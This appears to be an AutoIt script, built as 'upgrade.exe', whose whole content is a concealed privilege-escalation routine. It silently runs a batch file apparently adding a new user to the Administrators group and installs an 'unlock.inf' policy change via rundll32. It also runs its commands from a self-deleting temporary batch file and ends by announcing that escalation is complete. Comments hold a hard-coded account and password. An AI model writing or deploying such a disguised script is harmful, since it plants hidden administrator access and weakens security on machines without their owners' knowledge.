#RequireAdmin
#Region ;**** 由 AccAu3Wrapper_GUI 创建指令 ****
#AccAu3Wrapper_OutFile=G:\cj_2016\common\upgrade\upgrade.exe
#AccAu3Wrapper_UseX64=n
#AccAu3Wrapper_Res_Language=2052
#AccAu3Wrapper_Res_requestedExecutionLevel=None
#EndRegion ;**** 由 AccAu3Wrapper_GUI 创建指令 ****

#include <file.au3>

;~
ShellExecuteWait("C:\common\upgrade\addnewUserToAdmin.bat","","","open",@SW_HIDE)

$inf='rundll32 syssetup,SetupInfObjectInstallAction DefaultInstall 128 "C:\common\upgrade\unlock.inf"'

Global $cmd[1]=[$inf]
runBat($cmd)

$enable='C:\common\upgrade\Policy_enable.bat'
;~ RunAs("newUser",@ComputerName,"Password@1",0,$enable)
Run($enable)

Func runBat($cmd)
	Local $sFilePath=_TempFile(Default,Default,".bat")

	For $i In $cmd
		FileWriteLine($sFilePath,$i)
	Next
	FileWriteLine($sFilePath,"del %0")

;~ 	ShellExecute($sFilePath,"","","open",@SW_HIDE)
;~ 	RunAsWait("newUser",@ComputerName,"Password@1",0,$sFilePath)
	RunWait($sFilePath)
EndFunc

MsgBox(0,"","提权完成")